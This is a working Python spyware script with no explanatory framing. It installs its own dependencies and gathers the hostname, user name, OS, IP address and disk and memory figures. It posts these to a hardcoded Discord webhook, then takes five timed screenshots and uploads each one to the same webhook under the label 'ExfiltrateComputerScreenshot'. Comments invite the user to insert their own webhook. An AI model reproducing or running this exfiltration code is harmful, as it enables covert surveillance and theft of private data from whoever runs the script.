import subprocess
import sys
import socket
import os
import getpass
import platform
import shutil
import requests
from time import sleep

# Function to install required packages
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Try importing the required modules, install if they are missing
try:
    import pyautogui
except ModuleNotFoundError:
    print("pyautogui not found. Installing...")
    install('pyautogui')
    import pyautogui  # Try importing again after installation

try:
    import psutil
except ModuleNotFoundError:
    print("psutil not found. Installing...")
    install('psutil')
    import psutil  # Try importing again after installation

# Collect the hostname and logged-in user information
hostname = socket.gethostname()
logged_in_user = getpass.getuser()

# Get OS information
os_info = platform.platform()

# Get IP address
local_ip = socket.gethostbyname(hostname)

# Get disk usage
total, used, free = shutil.disk_usage("/")
disk_usage = f"Total: {total // (2**30)} GB, Used: {used // (2**30)} GB, Free: {free // (2**30)} GB"

# Get memory information
memory_info = psutil.virtual_memory()
memory_usage = f"Total: {memory_info.total // (2**30)} GB, Used: {memory_info.used // (2**30)} GB, Free: {memory_info.available // (2**30)} GB"

# Print system information
print(f"Hostname: {hostname}")
print(f"Logged-in user: {logged_in_user}")
print(f"Operating System: {os_info}")
print(f"Local IP Address: {local_ip}")

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/1297528862510678047/_dnVUmiSsddL6AUpFMMvht-TgFCpAEeDe-vQwgOyUHFmeZwPIqGu5UCncwxmA9kGPzyC"

# Send the system information to Discord
data = {
    "content": (
        f"Hostname: {hostname}\n"
        f"Logged-in user: {logged_in_user}\n"
        f"Operating System: {os_info}\n"
        f"Local IP Address: {local_ip}\n"
        f"Disk Usage: {disk_usage}\n"
        f"Memory Usage: {memory_usage}"
    ),
    "username": "SystemInfo"
}

response = requests.post(discord_webhook, json=data)

if response.status_code == 200:
    print("System information successfully sent to Discord!")
else:
    print(f"Error sending system information: {response.status_code}")

# Edit these variables as you want
SCREENSHOTS = 5
TIMING = 3

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # Take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(f"screenshot_{i + 1}.png")

    with open(f"screenshot_{i + 1}.png", "rb") as f:
        foto = f.read()

    richiesta = {
        "username": "ExfiltrateComputerScreenshot"
    }

    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={f"Screen#{i + 1}.png": foto})

    # Useful for debugging
    if response.status_code == 200:
        print(f"Photo {i + 1} successfully sent!")
    else:
        print(f"Error while submitting photo {i + 1}: {response.status_code}")
